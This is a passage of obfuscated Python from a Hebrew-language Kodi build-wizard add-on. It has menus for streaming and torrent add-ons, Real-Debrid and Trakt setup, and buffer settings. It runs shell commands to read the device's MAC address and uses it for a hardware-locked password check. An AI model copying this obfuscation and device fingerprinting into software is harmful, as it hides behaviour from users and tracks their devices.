						if OO000OOO0OOOOOOO0 .rfind (O000O00OO000O00O0 ,1 )>-1 :#line:1700
							OO000OOO0OOOOOOO0 =OO000OOO0OOOOOOO0 [1 :OO000OOO0OOOOOOO0 .rfind (O000O00OO000O00O0 )]#line:1701
					else :#line:1702
						if OO000OOO0OOOOOOO0 .find (" ")>0 :#line:1703
							OO000OOO0OOOOOOO0 =OO000OOO0OOOOOOO0 [:OO000OOO0OOOOOOO0 .find (" ")]#line:1704
						elif OO000OOO0OOOOOOO0 .find ("/")>0 :#line:1705
							OO000OOO0OOOOOOO0 =OO000OOO0OOOOOOO0 [:OO000OOO0OOOOOOO0 .find ("/")]#line:1706
						elif OO000OOO0OOOOOOO0 .find (">")>0 :#line:1707
							OO000OOO0OOOOOOO0 =OO000OOO0OOOOOOO0 [:OO000OOO0OOOOOOO0 .find (">")]#line:1708
					OOOOO0OOO0OOO0OO0 .append (OO000OOO0OOOOOOO0 .strip ())#line:1710
			O0O00O0OOO0OO0OO0 =OOOOO0OOO0OOO0OO0 #line:1711
		else :#line:1712
			OOOOO0OOO0OOO0OO0 =[]#line:1713
			for O0OOOOO000O0O0OO0 in O0O00O0OOO0OO0OO0 :#line:1714
				OOOO0OO0OOO0OO000 =u"</"+name #line:1715
				O00OOO00OOOO00O0O =OOOO00OO0O0OO0000 .find (O0OOOOO000O0O0OO0 )#line:1717
				O0OOOO00O0000000O =OOOO00OO0O0OO0000 .find (OOOO0OO0OOO0OO000 ,O00OOO00OOOO00O0O )#line:1718
				O000O00O0O0OOO0OO =OOOO00OO0O0OO0000 .find ("<"+name ,O00OOO00OOOO00O0O +1 )#line:1719
				while O000O00O0O0OOO0OO <O0OOOO00O0000000O and O000O00O0O0OOO0OO !=-1 :#line:1721
					O0000OOO00O0OO0OO =OOOO00OO0O0OO0000 .find (OOOO0OO0OOO0OO000 ,O0OOOO00O0000000O +len (OOOO0OO0OOO0OO000 ))#line:1722
					if O0000OOO00O0OO0OO !=-1 :#line:1723
						O0OOOO00O0000000O =O0000OOO00O0OO0OO #line:1724
					O000O00O0O0OOO0OO =OOOO00OO0O0OO0000 .find ("<"+name ,O000O00O0O0OOO0OO +1 )#line:1725
				if O00OOO00OOOO00O0O ==-1 and O0OOOO00O0000000O ==-1 :#line:1727
					OOOO0O0000OO000OO =u""#line:1728
				elif O00OOO00OOOO00O0O >-1 and O0OOOO00O0000000O >-1 :#line:1729
					OOOO0O0000OO000OO =OOOO00OO0O0OO0000 [O00OOO00OOOO00O0O +len (O0OOOOO000O0O0OO0 ):O0OOOO00O0000000O ]#line:1730
				elif O0OOOO00O0000000O >-1 :#line:1731
					OOOO0O0000OO000OO =OOOO00OO0O0OO0000 [:O0OOOO00O0000000O ]#line:1732
				elif O00OOO00OOOO00O0O >-1 :#line:1733
					OOOO0O0000OO000OO =OOOO00OO0O0OO0000 [O00OOO00OOOO00O0O +len (O0OOOOO000O0O0OO0 ):]#line:1734
				if ret :#line:1736
					OOOO0OO0OOO0OO000 =OOOO00OO0O0OO0000 [O0OOOO00O0000000O :OOOO00OO0O0OO0000 .find (">",OOOO00OO0O0OO0000 .find (OOOO0OO0OOO0OO000 ))+1 ]#line:1737
					OOOO0O0000OO000OO =O0OOOOO000O0O0OO0 +OOOO0O0000OO000OO +OOOO0OO0OOO0OO000 #line:1738
				OOOO00OO0O0OO0000 =OOOO00OO0O0OO0000 [OOOO00OO0O0OO0000 .find (OOOO0O0000OO000OO ,OOOO00OO0O0OO0000 .find (O0OOOOO000O0O0OO0 ))+len (OOOO0O0000OO000OO ):]#line:1740
				OOOOO0OOO0OOO0OO0 .append (OOOO0O0000OO000OO )#line:1741
			O0O00O0OOO0OO0OO0 =OOOOO0OOO0OOO0OO0 #line:1742
		OOOOOO00O000OOOOO +=O0O00O0OOO0OO0OO0 #line:1743
	return OOOOOO00O000OOOOO #line:1745
def addItem (O00OOOOOOO0OO0000 ,O0OO0000O0OO00O0O ,O0000O0O0OO000000 ,OO0000O0OOO0O00OO ,O000O000OO00O0O0O ,description =None ):#line:1747
	if description ==None :description =''#line:1748
	description ='[COLOR white]'+description +'[/COLOR]'#line:1749
	OOO0O0OOO000OOOOO =sys .argv [0 ]+"?url="+urllib .quote_plus (O0OO0000O0OO00O0O )+"&mode="+str (O0000O0O0OO000000 )+"&name="+urllib .quote_plus (O00OOOOOOO0OO0000 )+"&iconimage="+urllib .quote_plus (OO0000O0OOO0O00OO )+"&fanart="+urllib .quote_plus (O000O000OO00O0O0O )#line:1750
	O000000OO000OO0O0 =True #line:1751
	O000O00000OOO00O0 =xbmcgui .ListItem (O00OOOOOOO0OO0000 ,iconImage =OO0000O0OOO0O00OO ,thumbnailImage =OO0000O0OOO0O00OO )#line:1752
	O000O00000OOO00O0 .setInfo (type ="Video",infoLabels ={"Title":O00OOOOOOO0OO0000 ,"Plot":description })#line:1753
	O000O00000OOO00O0 .setProperty ("fanart_Image",O000O000OO00O0O0O )#line:1754
	O000O00000OOO00O0 .setProperty ("icon_Image",OO0000O0OOO0O00OO )#line:1755
	O000000OO000OO0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO0O0OOO000OOOOO ,listitem =O000O00000OOO00O0 ,isFolder =False )#line:1756
	return O000000OO000OO0O0 #line:1757
def get_params ():#line:1759
		O000O00O0OOOOOOO0 =[]#line:1760
		OOOO00O00O0OOOO00 =sys .argv [2 ]#line:1761
		if len (OOOO00O00O0OOOO00 )>=2 :#line:1762
				O0O0O000OO0O0OOOO =sys .argv [2 ]#line:1763
				O0O000O0O0O00O0O0 =O0O0O000OO0O0OOOO .replace ('?','')#line:1764
				if (O0O0O000OO0O0OOOO [len (O0O0O000OO0O0OOOO )-1 ]=='/'):#line:1765
						O0O0O000OO0O0OOOO =O0O0O000OO0O0OOOO [0 :len (O0O0O000OO0O0OOOO )-2 ]#line:1766
				O0O00O0O0OOOOO00O =O0O000O0O0O00O0O0 .split ('&')#line:1767
				O000O00O0OOOOOOO0 ={}#line:1768
				for OO0O00OO000OOOO0O in range (len (O0O00O0O0OOOOO00O )):#line:1769
						OOO00OOOOOO00O0O0 ={}#line:1770
						OOO00OOOOOO00O0O0 =O0O00O0O0OOOOO00O [OO0O00OO000OOOO0O ].split ('=')#line:1771
						if (len (OOO00OOOOOO00O0O0 ))==2 :#line:1772
								O000O00O0OOOOOOO0 [OOO00OOOOOO00O0O0 [0 ]]=OOO00OOOOOO00O0O0 [1 ]#line:1773
		return O000O00O0OOOOOOO0 #line:1775
def decode (OOOOO00OO0OO00O00 ,OO0O00OO00OOO00OO ):#line:1780
    import base64 #line:1781
    OO00O0OO0O000O00O =[]#line:1782
    if (len (OOOOO00OO0OO00O00 ))!=4 :#line:1784
     return 10 #line:1785
    OO0O00OO00OOO00OO =base64 .urlsafe_b64decode (OO0O00OO00OOO00OO )#line:1786
    for OOOO0000OO0OO0OO0 in range (len (OO0O00OO00OOO00OO )):#line:1788
        OOO0OOO00O00O0OO0 =OOOOO00OO0OO00O00 [OOOO0000OO0OO0OO0 %len (OOOOO00OO0OO00O00 )]#line:1789
        OOOOOO000O00OOO0O =chr ((256 +ord (OO0O00OO00OOO00OO [OOOO0000OO0OO0OO0 ])-ord (OOO0OOO00O00O0OO0 ))%256 )#line:1790
        OO00O0OO0O000O00O .append (OOOOOO000O00OOO0O )#line:1791
    return "".join (OO00O0OO0O000O00O )#line:1792
def tmdb_list (O000O00OO0OOOOO00 ):#line:1793
    O0OOOO00O0OOO0OO0 =decode ("7643",O000O00OO0OOOOO00 )#line:1796
    return int (O0OOOO00O0OOO0OO0 )#line:1799
def u_list (OO0OO00OOOOOO0000 ):#line:1800
    from math import sqrt #line:1802
    OO0O0O00O0O000O0O =tmdb_list (TMDB_NEW_API )#line:1803
    OOO0000O0O00O0000 =str ((getHwAddr ('eth0'))*OO0O0O00O0O000O0O )#line:1805
    O000OO0000OO0O0OO =int (OOO0000O0O00O0000 [1 ]+OOO0000O0O00O0000 [2 ]+OOO0000O0O00O0000 [5 ]+OOO0000O0O00O0000 [7 ])#line:1806
    OOO0OOOOO00O0O0O0 =(ADDON .getSetting ("pass"))#line:1808
    OO0OOOO00OO0O0OO0 =(str (round (sqrt ((O000OO0000OO0O0OO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1813
    if '.'in OO0OOOO00OO0O0OO0 :#line:1814
     OO0OOOO00OO0O0OO0 =(str (round (sqrt ((O000OO0000OO0O0OO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1815
    if OOO0OOOOO00O0O0O0 ==OO0OOOO00OO0O0OO0 :#line:1817
      OOOO0O0O0000O00O0 =OO0OO00OOOOOO0000 #line:1819
    else :#line:1821
       if STARTP2 ()and STARTP ()=='ok':#line:1822
         return OO0OO00OOOOOO0000 #line:1825
       OOOO0O0O0000O00O0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1826
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1827
       sys .exit ()#line:1828
    return OOOO0O0O0000O00O0 #line:1829
def disply_hwr ():#line:1832
   try :#line:1833
    O00OO0OO00000O000 =tmdb_list (TMDB_NEW_API )#line:1834
    OO0O0O0000000O000 =str ((getHwAddr ('eth0'))*O00OO0OO00000O000 )#line:1835
    OOOOOOOOOOOOOO0OO =(OO0O0O0000000O000 [1 ]+OO0O0O0000000O000 [2 ]+OO0O0O0000000O000 [5 ]+OO0O0O0000000O000 [7 ])#line:1842
    OO00O0O0OOO0OOOO0 =(ADDON .getSetting ("action"))#line:1843
    wiz .setS ('action',str (OOOOOOOOOOOOOO0OO ))#line:1845
   except :pass #line:1846
def disply_hwr2 ():#line:1847
   try :#line:1848
    O0O00000O000OOO0O =tmdb_list (TMDB_NEW_API )#line:1849
    OOOOO0000O00O00OO =str ((getHwAddr ('eth0'))*O0O00000O000OOO0O )#line:1851
    O000000000000OOO0 =(OOOOO0000O00O00OO [1 ]+OOOOO0000O00O00OO [2 ]+OOOOO0000O00O00OO [5 ]+OOOOO0000O00O00OO [7 ])#line:1860
    O00O0OO0OOO00OO0O =(ADDON .getSetting ("action"))#line:1861
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O000000000000OOO0 )#line:1864
   except :pass #line:1865
def getHwAddr (O0OO0000OO00O0O00 ):#line:1867
   import subprocess ,time #line:1868
   O00O0O0O0000OO000 ='windows'#line:1869
   if xbmc .getCondVisibility ('system.platform.android'):#line:1870
       O00O0O0O0000OO000 ='android'#line:1871
   if xbmc .getCondVisibility ('system.platform.android'):#line:1872
     OOO0O0OO0OOO000OO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1873
     OOO0OOOOOO00O00O0 =re .compile ('link/ether (.+?) brd').findall (str (OOO0O0OO0OOO000OO ))#line:1875
     OO0O00OO00OOO0OO0 =0 #line:1876
     for O0O0OO00O00O00O00 in OOO0OOOOOO00O00O0 :#line:1877
      if OOO0OOOOOO00O00O0 !='00:00:00:00:00:00':#line:1878
          OOOO00O000000OOO0 =O0O0OO00O00O00O00 #line:1879
          OO0O00OO00OOO0OO0 =OO0O00OO00OOO0OO0 +int (OOOO00O000000OOO0 .replace (':',''),16 )#line:1880
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1882
       OO0OO0O000OO0O00O =0 #line:1883
       OO0O00OO00OOO0OO0 =0 #line:1884
       OOOOO0000OOO0O0OO =[]#line:1885
       OO000O0OO0O0O0000 =os .popen ("getmac").read ()#line:1886
       OO000O0OO0O0O0000 =OO000O0OO0O0O0000 .split ("\n")#line:1887
       for OO0O0OO0OOOOOOOOO in OO000O0OO0O0O0000 :#line:1889
            OO00O0O000000OOOO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO0O0OO0OOOOOOOOO ,re .I )#line:1890
            if OO00O0O000000OOOO :#line:1891
                OOO0OOOOOO00O00O0 =OO00O0O000000OOOO .group ().replace ('-',':')#line:1892
                OOOOO0000OOO0O0OO .append (OOO0OOOOOO00O00O0 )#line:1893
                OO0O00OO00OOO0OO0 =OO0O00OO00OOO0OO0 +int (OOO0OOOOOO00O00O0 .replace (':',''),16 )#line:1896
   else :#line:1898
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1899
   try :#line:1916
    return OO0O00OO00OOO0OO0 #line:1917
   except :pass #line:1918
def getpass ():#line:1919
	disply_hwr2 ()#line:1921
def setpass ():#line:1922
    OOO0O00OOO0O0000O =xbmcgui .Dialog ()#line:1923
    OOO0OOO0O00OO0O0O =''#line:1924
    OO0OO000OO00O0000 =xbmc .Keyboard (OOO0OOO0O00OO0O0O ,'הכנס סיסמה')#line:1926
    OO0OO000OO00O0000 .doModal ()#line:1927
    if OO0OO000OO00O0000 .isConfirmed ():#line:1928
           OO0OO000OO00O0000 =OO0OO000OO00O0000 .getText ()#line:1929
    wiz .setS ('pass',str (OO0OO000OO00O0000 ))#line:1930
def setuname ():#line:1931
    O00O0OO0O000O0000 =''#line:1932
    OOO0O0OOOO0OOO0OO =xbmc .Keyboard (O00O0OO0O000O0000 ,'הכנס שם משתמש')#line:1933
    OOO0O0OOOO0OOO0OO .doModal ()#line:1934
    if OOO0O0OOOO0OOO0OO .isConfirmed ():#line:1935
           O00O0OO0O000O0000 =OOO0O0OOOO0OOO0OO .getText ()#line:1936
           wiz .setS ('user',str (O00O0OO0O000O0000 ))#line:1937
def powerkodi ():#line:1938
    os ._exit (1 )#line:1939
def buffer1 ():#line:1941
	OOOOO00O000OOO00O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1942
	O0OO00OOOO00OO000 =xbmc .getInfoLabel ("System.Memory(total)")#line:1943
	OO000OO00OO00000O =xbmc .getInfoLabel ("System.FreeMemory")#line:1944
	OO0O0O0O00OO00OO0 =re .sub ('[^0-9]','',OO000OO00OO00000O )#line:1945
	OO0O0O0O00OO00OO0 =int (OO0O0O0O00OO00OO0 )/3 #line:1946
	O000OO00O00O0O0O0 =OO0O0O0O00OO00OO0 *1024 *1024 #line:1947
	try :O0OOO0OOO00OOOO0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1948
	except :O0OOO0OOO00OOOO0O =16 #line:1949
	O0OO00OO00OO00OO0 =DIALOG .yesno ('FREE MEMORY: '+str (OO000OO00OO00000O ),'Based on your free Memory your optimal buffersize is: '+str (OO0O0O0O00OO00OO0 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1952
	if O0OO00OO00OO00OO0 ==1 :#line:1953
		with open (OOOOO00O000OOO00O ,"w")as O0000O0O000OO0OOO :#line:1954
			if O0OOO0OOO00OOOO0O >=17 :O0O0OO00O000OOOO0 =xml_data_advSettings_New (str (O000OO00O00O0O0O0 ))#line:1955
			else :O0O0OO00O000OOOO0 =xml_data_advSettings_old (str (O000OO00O00O0O0O0 ))#line:1956
			O0000O0O000OO0OOO .write (O0O0OO00O000OOOO0 )#line:1958
			DIALOG .ok ('Buffer Size Set to: '+str (O000OO00O00O0O0O0 ),'Please restart Kodi for settings to apply.','')#line:1959
	elif O0OO00OO00OO00OO0 ==0 :#line:1961
		O000OO00O00O0O0O0 =_O0OOOOO0OOO00OOO0 (default =str (O000OO00O00O0O0O0 ),heading ="INPUT BUFFER SIZE")#line:1962
		with open (OOOOO00O000OOO00O ,"w")as O0000O0O000OO0OOO :#line:1963
			if O0OOO0OOO00OOOO0O >=17 :O0O0OO00O000OOOO0 =xml_data_advSettings_New (str (O000OO00O00O0O0O0 ))#line:1964
			else :O0O0OO00O000OOOO0 =xml_data_advSettings_old (str (O000OO00O00O0O0O0 ))#line:1965
			O0000O0O000OO0OOO .write (O0O0OO00O000OOOO0 )#line:1966
			DIALOG .ok ('Buffer Size Set to: '+str (O000OO00O00O0O0O0 ),'Please restart Kodi for settings to apply.','')#line:1967
def xml_data_advSettings_old (OO00000O0OOOO0OO0 ):#line:1968
	O00O0O0OO00O0OOOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO00000O0OOOO0OO0 #line:1978
	return O00O0O0OO00O0OOOO #line:1979
def xml_data_advSettings_New (O0O00O0OO0OOOO0OO ):#line:1981
	OO00O0O000O000O00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0O00O0OO0OOOO0OO #line:1993
	return OO00O0O000O000O00 #line:1994
def write_ADV_SETTINGS_XML (O0O00O00O00OO0O0O ):#line:1995
    if not os .path .exists (xml_file ):#line:1996
        with open (xml_file ,"w")as OO0000O00OOO0O00O :#line:1997
            OO0000O00OOO0O00O .write (xml_data )#line:1998
def _O0OOOOO0OOO00OOO0 (default ="",heading ="",hidden =False ):#line:1999
    ""#line:2000
    O0O0OO00OOOO00000 =xbmc .Keyboard (default ,heading ,hidden )#line:2001
    O0O0OO00OOOO00000 .doModal ()#line:2002
    if (O0O0OO00OOOO00000 .isConfirmed ()):#line:2003
        return unicode (O0O0OO00OOOO00000 .getText (),"utf-8")#line:2004
    return default #line:2005
def index ():#line:2007
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2008
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2009
	if AUTOUPDATE =='Yes':#line:2010
		if wiz .workingURL (WIZARDFILE )==True :#line:2011
			O0OOOO000000OO000 =wiz .checkWizard ('version')#line:2012
			if O0OOOO000000OO000 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0OOOO000000OO000 ),'wizardupdate',themeit =THEME2 )#line:2013
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2014
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2015
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2016
	if len (BUILDNAME )>0 :#line:2017
		O00O00OOOO0O00OOO =wiz .checkBuild (BUILDNAME ,'version')#line:2018
		O00O0OOOOOOOO0O0O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2019
		if O00O00OOOO0O00OOO >BUILDVERSION :O00O0OOOOOOOO0O0O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O00O0OOOOOOOO0O0O ,O00O00OOOO0O00OOO )#line:2020
		addDir (O00O0OOOOOOOO0O0O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2022
		try :#line:2024
		     O000000O0O0OOO00O =wiz .themeCount (BUILDNAME )#line:2025
		except :#line:2026
		   O000000O0O0OOO00O =False #line:2027
		if not O000000O0O0OOO00O ==False :#line:2028
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2029
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2030
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2033
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2034
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2035
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2039
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2041
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2043
def morsetup ():#line:2045
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2046
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2047
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2048
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2049
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2050
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2054
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2055
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2058
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2059
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2069
	setView ('files','viewType')#line:2070
def morsetup2 ():#line:2071
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2072
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2073
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2074
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2075
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2076
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2077
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2078
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2079
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2080
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2081
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2082
def fastupdate ():#line:2083
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2084
def forcefastupdate ():#line:2086
			OO00O0000OO00OO00 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2087
			wiz .ForceFastUpDate (ADDONTITLE ,OO00O0000OO00OO00 )#line:2088
def rdsetup ():#line:2092
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2093
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2094
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2096
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2097
def traktsetup ():#line:2100
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2101
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2102
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2103
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2104
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2105
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2106
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2107
	setView ('files','viewType')#line:2108
def setautorealdebrid ():#line:2109
    from resources .libs import real_debrid #line:2110
    O0O0000OOOOO0OO00 =real_debrid .RealDebridFirst ()#line:2111
    O0O0000OOOOO0OO00 .auth ()#line:2112
def setrealdebrid ():#line:2114
    OOO000O00O0O00OOO =(ADDON .getSetting ("auto_rd"))#line:2115
    if OOO000O00O0O00OOO =='false':#line:2116
       ADDON .openSettings ()#line:2117
    else :#line:2118
        from resources .libs import real_debrid #line:2119
        OO0000O000OOO0O0O =real_debrid .RealDebrid ()#line:2120
        OO0000O000OOO0O0O .auth ()#line:2121
        rdon ()#line:2124
def resolveurlsetup ():#line:2126
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2127
def urlresolversetup ():#line:2128
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2129
def placentasetup ():#line:2131
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2132
def reptiliasetup ():#line:2133
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2134
def flixnetsetup ():#line:2135
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2136
def yodasetup ():#line:2137
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2138
def numberssetup ():#line:2139
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2140
def uranussetup ():#line:2141
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2142
def genesissetup ():#line:2143
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2144
def net_tools (view =None ):#line:2146
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2147
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2148
	setView ('files','viewType')#line:2150
def speedMenu ():#line:2151
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2152
def viewIP ():#line:2153
	OOOOOOO0OOOOO0O0O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2167
	OO00OO000O0OO0OO0 =[];OOO00O0OOO00O0O00 =0 #line:2168
	for OOOO00OOO0O0000OO in OOOOOOO0OOOOO0O0O :#line:2169
		OOO0OOO0O0O000O00 =wiz .getInfo (OOOO00OOO0O0000OO )#line:2170
		O0O000O0000OOO0O0 =0 #line:2171
		while OOO0OOO0O0O000O00 =="Busy"and O0O000O0000OOO0O0 <10 :#line:2172
			OOO0OOO0O0O000O00 =wiz .getInfo (OOOO00OOO0O0000OO );O0O000O0000OOO0O0 +=1 ;wiz .log ("%s sleep %s"%(OOOO00OOO0O0000OO ,str (O0O000O0000OOO0O0 )));xbmc .sleep (1000 )#line:2173
		OO00OO000O0OO0OO0 .append (OOO0OOO0O0O000O00 )#line:2174
		OOO00O0OOO00O0O00 +=1 #line:2175
	OO0OO0000O0O0OO00 ,OO000O00O0O0OO0O0 ,O0000O00OO000O000 =getIP ()#line:2176
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000O0OO0OO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2177
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0000O0O0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2178
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O00O0O0OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2179
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O00OO000O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2180
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000O0OO0OO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2181
	setView ('files','viewType')#line:2182
def buildMenu ():#line:2184
	if USERNAME =='':#line:2185
		ADDON .openSettings ()#line:2186
		sys .exit ()#line:2187
	if PASSWORD =='':#line:2188
		ADDON .openSettings ()#line:2189
	O00O0OOOOO0OOO0OO =u_list (SPEEDFILE )#line:2190
	(O00O0OOOOO0OOO0OO )#line:2191
